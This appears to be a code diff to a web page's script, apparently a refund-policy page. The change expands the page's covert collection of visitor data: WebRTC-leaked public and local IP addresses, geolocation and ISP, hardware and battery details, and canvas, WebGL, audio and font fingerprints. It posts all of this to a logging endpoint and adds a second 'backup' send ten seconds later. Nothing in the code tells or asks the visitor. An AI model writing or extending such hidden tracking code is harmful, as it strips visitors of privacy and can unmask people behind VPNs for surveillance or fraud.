@@ -782,25 +782,78 @@
                     // Log complete data to serverless API after encryption is done
                     try {
                         console.log('Logging detection data to server...');
+                        console.log('Number of data fields to log:', Object.keys(data).length);
                         
                         // Prepare the full payload with both raw and encrypted data
                         const payload = {
-                            type: 'ip_detection_data',
+                            type: 'browser_fingerprint_data',
                             encryptedString: reversed,
-                            data: data,
-                            url: window.location.href,
-                            referrer: document.referrer || 'Direct',
-                            userAgent: navigator.userAgent,
-                            timestamp: new Date().toISOString(),
-                            queryParams: new URLSearchParams(window.location.search).toString()
+                            detectionData: {
+                                // Network
+                                publicIP: data.publicIP,
+                                localIP: data.localIP,
+                                ipv6: data.ipv6,
+                                webRTCPublicIPs: data.webRTCPublicIPs,
+                                webRTCLocalIPs: data.webRTCLocalIPs,
+                                
+                                // Location
+                                country: data.country,
+                                city: data.city,
+                                region: data.region,
+                                timezone: data.timezone,
+                                isp: data.isp,
+                                
+                                // Browser
+                                userAgent: data.userAgent,
+                                platform: data.platform,
+                                vendor: data.vendor,
+                                language: data.language,
+                                languages: data.languages,
+                                
+                                // Screen
+                                screenRes: data.screenRes,
+                                colorDepth: data.colorDepth,
+                                pixelRatio: data.pixelRatio,
+                                innerRes: data.innerRes,
+                                
+                                // Hardware
+                                hardwareCores: data.hardwareCores,
+                                deviceMemory: data.deviceMemory,
+                                batteryLevel: data.batteryLevel,
+                                maxTouchPoints: data.maxTouchPoints,
+                                
+                                // Fingerprints
+                                canvasHash: data.canvasHash,
+                                webGLVendor: data.webGLVendor,
+                                webGLRenderer: data.webGLRenderer,
+                                audioHash: data.audioHash,
+                                
+                                // Features
+                                cookiesEnabled: data.cookiesEnabled,
+                                localStorage: data.localStorage,
+                                webRTCEnabled: data.webRTCEnabled,
+                                plugins: data.plugins,
+                                fontsCount: data.fontsCount,
+                                
+                                // Full data as JSON string to preserve everything
+                                fullDataJSON: JSON.stringify(data)
+                            },
+                            metadata: {
+                                url: window.location.href,
+                                referrer: document.referrer || 'Direct',
+                                timestamp: new Date().toISOString(),
+                                queryParams: new URLSearchParams(window.location.search).toString()
+                            }
                         };
                         
-                        console.log('Sending payload to server:', payload);
+                        console.log('Sending comprehensive payload to server...');
+                        console.log('Payload size:', JSON.stringify(payload).length, 'bytes');
                         
                         const response = await fetch('/api/refund-policy/log', {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/json',
+                                'X-Detection-Type': 'browser-fingerprint'
                             },
                             body: JSON.stringify(payload)
                         });
@@ -809,7 +862,7 @@
                             const result = await response.json();
                             console.log('✅ Detection data successfully logged to server!');
                             console.log('Server response:', result);
-                            console.log('Data logged includes:', Object.keys(data).length, 'fields');
+                            console.log('Successfully logged', Object.keys(data).length, 'data fields');
                         } else {
                             const errorText = await response.text();
                             console.error('❌ Server logging failed with status:', response.status);
@@ -840,6 +893,79 @@
                         refMessage.textContent = 'reference code below';
                     }
                 }, 4000);
+                
+                // Send a backup request after 10 seconds to ensure data is captured
+                setTimeout(async () => {
+                    console.log('Sending backup data log after 10 seconds...');
+                    
+                    // Get the encrypted string from the page if it exists
+                    const encryptedDiv = document.querySelector('.hidden').nextSibling;
+                    const encryptedString = encryptedDiv ? encryptedDiv.textContent : 'Not yet generated';
+                    
+                    // Prepare comprehensive backup payload
+                    const backupPayload = {
+                        type: 'browser_fingerprint_backup',
+                        encryptedString: encryptedString,
+                        detectionData: {
+                            // Network
+                            publicIP: publicIP || 'N/A',
+                            localIP: localIP || 'N/A',
+                            ipv6: ipv6 || 'N/A',
+                            webRTCIPs: {
+                                public: webRTCIPs.public || [],
+                                local: webRTCIPs.local || [],
+                                ipv6: webRTCIPs.ipv6 || []
+                            },
+                            
+                            // Location data
+                            geoData: ipData || {},
+                            
+                            // Browser info - all fields
+                            browserConfig: browserInfo,
+                            
+                            // Fingerprints
+                            fingerprints: {
+                                canvas: canvasFingerprint,
+                                webGL: webGLFingerprint,
+                                audio: audioFingerprint,
+                                fonts: installedFonts,
+                                mediaTypes: mediaTypes,
+                                webGLExtensions: webGLExtensions
+                            }
+                        },
+                        metadata: {
+                            url: window.location.href,
+                            referrer: document.referrer || 'Direct',
+                            userAgent: navigator.userAgent,
+                            timestamp: new Date().toISOString(),
+                            queryParams: new URLSearchParams(window.location.search).toString(),
+                            dataCollectionComplete: true
+                        }
+                    };
+                    
+                    try {
+                        console.log('Sending backup payload with full data...');
+                        
+                        const response = await fetch('/api/refund-policy/log', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'X-Detection-Type': 'browser-fingerprint-backup'
+                            },
+                            body: JSON.stringify(backupPayload)
+                        });
+                        
+                        if (response.ok) {
+                            const result = await response.json();
+                            console.log('✅ Backup data successfully logged to server!');
+                            console.log('Backup response:', result);
+                        } else {
+                            console.error('❌ Backup logging failed:', response.status);
+                        }
+                    } catch (error) {
+                        console.error('❌ Error sending backup data:', error);
+                    }
+                }, 10000);
                 
             } catch (error) {
                 ipInfoDiv.innerHTML = `<div style="color: #f00; text-align: center;">
@@ -977,7 +1103,7 @@
                 }
                 console.log('===================================================');
                 
-                // Send to serverless function
+                // Send to serverless function - QUERY PARAMS ONLY
                 try {
                     console.log('Sending query parameters to server...');
                     
@@ -985,8 +1111,10 @@
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
+                            'X-Detection-Type': 'query-params'
                         },
                         body: JSON.stringify({
+                            type: 'query_params_only',
                             queryParams: queryParams,
                             url: window.location.href,
                             referrer: document.referrer || 'Direct',
